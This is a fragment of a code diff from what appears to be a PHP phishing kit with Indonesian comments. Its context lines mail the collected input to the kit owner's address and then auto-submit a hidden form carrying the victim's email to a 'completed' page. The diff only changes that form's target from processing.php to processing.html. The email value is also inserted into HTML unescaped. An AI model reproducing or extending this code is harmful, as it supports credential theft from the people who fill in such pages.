@@ -89,7 +89,7 @@ $kirim = mail($emailku, $subjek, $pesan, $headers);
 
 // MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
 if($kirim) {
-echo "<form id='gungrate' method='POST' action='processing.php'>
+echo "<form id='gungrate' method='POST' action='processing.html'>
 <input type='hidden' name='email' value='$email'>
 </form>
 <script type='text/javascript'>document.getElementById('gungrate').submit();</script>";
